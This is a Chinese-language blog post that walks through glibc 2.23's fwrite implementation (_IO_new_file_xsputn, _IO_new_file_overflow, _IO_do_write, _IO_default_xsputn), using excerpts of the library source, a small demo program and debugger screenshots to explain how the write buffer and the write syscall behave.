<img src="https://s2.loli.net/2022/08/12/iUOa84sphV1Wmyw.png" alt="image-20220811201511246" style="zoom:50%;" />

<p>上面第一张图片是fwrite函数的整体流程，第二张图片是根据我下面写的这个源代码对应的函数调用流程(调试的时候结合这两个图片，可以对自己调试到哪部分有个比较清楚的认知)。</p>
<h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">25</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>_IO_fwrite 源代码(fwrite原型为_IO_fwrite函数)如下，这段很好分析，先是判断了request（也就是我们要输入的字节数是否为0），然后加锁去执行_IO_sputn函数(该函数是vtable中的_IO_new_file_xsputn函数)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后进入了_IO_new_file_xsputn函数，先是有个if判断如下，这里我很迷惑，因为我不清楚_flags对应的各个位都是什么含义，尽管<strong>通过调试可以看出来这个if并没有进去</strong>，但实际上我并不知道为什么这个if进不去，我上网找了很多资料也没有找到相关_flags各个位的含义，那就继续往下分析吧。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">   &#123;</span><br><span class="line">     count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">     <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  count = p - s + <span class="number">1</span>;</span><br><span class="line">	  must_flush = <span class="number">1</span>;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<p>如果没有进入上面的if，则会去判断是否还存在剩余的输出缓冲区（如下），count是剩余输出缓冲区的大小，to_do是需要往文件中写入的字节数。</p>
<p>根据下面这段代码分析，现在有三种情况分别是count&gt;to_do    count&lt;to_do    count&#x3D;&#x3D;0</p>
<p>第一种是剩余的输出缓冲区比我们要输入的数据大，那memcpy执行后将数据拷贝到输出缓冲区就完事大吉，因为if (to_do + must_flush &gt; 0)这行代码是进不去的，所以就直接return了。第二种是剩余的输出缓冲区比我们要输入的数据小，也进行memcpy函数的拷贝，只不过拷贝后，因为还有数据没有拷贝进输出缓冲区(此时输出缓冲区已经满了)，那就去执行_IO_new_file_overflow函数，它有俩作用，如果不存在输出缓冲区则会进行创建reserve area，如果存在的话，则会调用_IO_do_write函数进行刷新，等刷新后再去拷贝剩下的数据到输出缓冲区。然后还有第三种情况就是此时并没有输出缓冲区。那也去执行_IO_new_file_overflow函数进行创建reserve area，再去拷贝数据到输出缓冲区。</p>
<p>第一种情况下面的代码写的很清楚了，就不再分析第一种情况。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>第二种和第三种情况都会进入这个if中（这个if的代码我没放全，等分析到下面再放之后的部分），进入这个函数后就去调用了_IO_OVERFLOW (f, EOF)，这个函数是vtable中的_IO_new_file_overflow。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     _IO_size_t block_size, do_write;</span><br><span class="line">     <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br></pre></td></tr></table></figure>



<p>进入_IO_new_file_overflow函数(代码如下)，可以发现有一个对f-&gt;_IO_write_base是否为空的判断，而程序通过这个判断来判定是否没有分配resever area。如果没有分配的话则去执行_IO_doallocbuf函数来分配resever area(这个函数在<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">fread源码分析</a>中已经分析过了，这里就不再分析了)，_IO_setg这个宏的作用就是将三个read指针全部赋值为f-&gt;_IO_buf_base(f-&gt;_IO_buf_base在_IO_doallocbuf函数中已经被初始化过了)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">          <span class="comment">/* #define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="comment">	(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))*/</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>下面的代码一定要注意，此处是将_IO_write_ptr和_IO_write_base两个指针都初始化为了_IO_buf_base的值，<strong>但_IO_write_end指针却是初始化为了_IO_buf_end</strong>（read的三个相关指针是都被初始化为了_IO_buf_base）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">			   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">     f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">     f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">     f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">     f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">     f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br></pre></td></tr></table></figure>



<p>然后由于当初调用_IO_OVERFLOW函数的时候，第二个参数为EOF</p>
<p><img src="https://s2.loli.net/2022/08/12/KBfmDGZv7RVIsyh.png" alt="image-20220811182225383"></p>
<p>因此_IO_new_file_overflow函数的ch为EOF</p>
<p><img src="https://s2.loli.net/2022/08/12/N1sd9CWzrle6JfZ.png" alt="image-20220811182330917"></p>
<p>所以上面几个指针赋值过后，执行下面if的时候就直接进入了,调用了_IO_do_write函数，注意下_IO_do_write的第三个参数，如果是新创建的reserve area，那么 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base的值则为0的（如下代码）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">	 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>



<p>因为刚才说过，这个to_do其实就是0，因此return返回的时候发现to_do&#x3D;&#x3D;0成立并且后面是||，就直接从_IO_new_do_write函数返回了，并没有去执行后面的new_do_write函数(当时分析到这里，我还不信，于是写了个demo测试了一下发现确实如此(如下图)）<strong>注意:前面讨论的是新创建reserve area执行到这里的情况，如果是输出缓冲有数据的话，来到这里就会执行new_do_write函数，从而触发系统调用write来刷新输出缓冲区(不仅数据被刷新了出去,同时_IO_write_ptr指针也进行了更新)。</strong>总结一下就是_IO_new_do_write函数对输出缓冲区中的数据进行了一个判断，如果存在数据的话就调用write函数来将输出缓冲区中的数据写入文件，否则的话就直接返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2022/08/12/EBw1xTPb2yfiCDh.png" alt="image-20220811183408807" style="zoom:50%;" />

<p>然后程序一直返回到_IO_new_file_xsputn函数，接下这段代码实现的是如果要写到文件里的数据大于了reserve area这块区域(通常是0x1000,也就是4k)，那就将大于的部分直接执行系统调用write输出到文件，剩下的部分则写到输出缓冲区中。比如我们要写10k的数据到文件中，而reserve are为4k，那8k的数据都将直接被系统调用write写入文件中，另外2k的数据放到输出缓冲区中。</p>
<p>上述功能的实现核心代码就是这一行<code>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</code>(不得不说，这一行写的是真巧妙)，如果写入的数据量本身就小于reserve area的话，那do_write就会是0，也就无法进入下面那个if。而if中的new_do_write函数中执行了系统调用write，并且重置了_IO_write_ptr指针(如下图)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">     do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/08/12/z5xYhPaUNspGkmI.png" alt="image-20220812213721975"></p>
<p>这里也就是将大块的数据(大于reserve area的数据)去直接执行系统调用write写入文件，而剩余的小块(小于reserve area的数据)拷贝到输出缓冲区中（下面代码的_IO_default_xsputn函数调用了拷贝函数memcpy）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br></pre></td></tr></table></figure>



<p>_IO_default_xsputn函数的源码如下，这个函数分析起来还是比较简单的。more是我们需要写入文件的字节数，count是输出缓冲区剩余的字节数。如果我们需要写入文件的字节数大于20的话，就执行memcpy函数去拷贝，如果小于20的话，就用for循环一个字节一个字节的拷贝(这个策略应该是效率比较高的)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      _IO_ssize_t i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后这个函数执行完毕后，整个fwrite函数也就算是结束了。</p>
<h2 id="总结fwrite函数的调用流程："><a href="#总结fwrite函数的调用流程：" class="headerlink" title="总结fwrite函数的调用流程："></a>总结fwrite函数的调用流程：</h2><p>先尝试将数据拷贝到输出缓冲区，如果全部都拷贝过去的话函数就直接返回。如果只拷贝过去了一部分数据，另外一部分数据因为输出缓冲区满的话又或者没有分配reserve area的话都调用_IO_new_file_overflow函数，然后这个函数会新创建一个reserve area或者执行系统调用write刷新输出缓冲区。最后来判断要写入的字节数是否小于reserve area，如果小于的话则将数据拷贝到输出缓冲区中，如果大于的话则将大于部分用系统调用write写入文件剩余部分再拷贝到输出缓冲区。<strong>注意：这个demo程序的话，调试到fwrite函数结束也没有发现系统调用了write，这是因为输出缓冲区将在程序结束时的exit函数中的_IO_cleanup函数调用_IO_flush_all_lockp函数时进行刷新，此时才会执行系统调用write</strong></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fwrite">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1279/#toc__1">IO FILE之fwrite详解 - 跳跳糖 (tttang.com)</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/mut3p1g/file-struct"> (leanote.com)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/4/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
